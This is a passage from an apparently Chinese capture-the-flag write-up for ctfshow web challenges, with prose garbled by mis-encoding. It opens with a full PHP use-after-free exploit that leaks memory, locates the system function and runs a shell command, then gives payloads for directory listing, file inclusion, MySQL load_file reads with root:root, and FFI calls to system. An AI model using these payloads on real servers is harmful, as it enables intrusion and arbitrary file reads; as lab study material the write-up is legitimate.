variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>        <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>            <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></code></pre><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>é¦–å…ˆæŸ¥æ‰¾flagä½ç½®,ç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«å¾—åˆ°flag</p><p>Payload:</p><blockquote><p>1ã€c&#x3D;var_export(scandir(â€˜&#x2F;â€˜));exit(0);c&#x3D;require_once(â€˜&#x2F;flagc.txtâ€™);exit(0);</p><p>2ã€c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(â€˜flagc.txtâ€™);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandirå‡½æ•°è¢«banäº†ï¼Œä½¿ç”¨DirectoryIteratorç±»ï¼Œflagåœ¨&#x2F;flagx.txt</p><p>æˆ–è€…ä½¿ç”¨globåè®®</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(â€˜..&#x2F;..&#x2F;..â€™.â€™&#x2F;*â€™));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>å¯ä»¥æŸ¥åˆ°flagä½ç½®ï¼š&#x2F;flag36.txt  ä½†æ˜¯includeè¢«banäº†ï¼Œä¹‹å‰çš„pocå› ä¸ºstrlenè¢«ç¦äº†è·å–ä¸åˆ°systemåœ°å€ä¹Ÿæ²¡æ³•ç”¨äº†</p><p>å¯ä»¥ä½¿ç”¨mysqlçš„load_fileå‡½æ•°</p><p>å…ˆæŸ¥è¯¢æ•°æ®åº“</p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=localhost;dbname=information_schema"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">## $rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æŸ¥åˆ°äº†ctftrainingçš„æ•°æ®åº“ï¼Œç„¶åä½¿ç”¨load_fileè¯»å–flag</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>PayloadåŒä¸Š</p><h4 id="web77-FFI-php7-4ä»¥ä¸Š"><a href="#web77-FFI-php7-4ä»¥ä¸Š" class="headerlink" title="web77(FFI php7.4ä»¥ä¸Š)"></a>web77(FFI php7.4ä»¥ä¸Š)</h4><p>FFIï¼Œphp7.4ä»¥ä¸Šæ‰æœ‰</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(â€œint system(const char *command);â€);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡<br>$a&#x3D;â€™&#x2F;readflag &gt; 1.txtâ€™;   &#x2F;&#x2F;æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦é‡å®šå‘åˆ°æ–‡ä»¶<br>$ffi-&gt;system($a);       &#x2F;&#x2F;é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</p></blockquote><h4 id="web118-Bashå†…ç½®å˜é‡"><a href="#web118-Bashå†…ç½®å˜é‡" class="headerlink" title="web118(Bashå†…ç½®å˜é‡)"></a>web118(Bashå†…ç½®å˜é‡)</h4><p><img src="web118_3.png" loading="lazy"></p><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p><img src="web119_3.png" loading="lazy"></p><h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p><img src="web120.png" loading="lazy"></p><h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><p><img src="web121.png" loading="lazy"></p><h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><p><img src="web122.png" loading="lazy"></p><h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCNåˆèµ›åŸé¢˜</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"> &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: æ”¶é›†è‡ªç½‘ç»œ# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);        &#125;    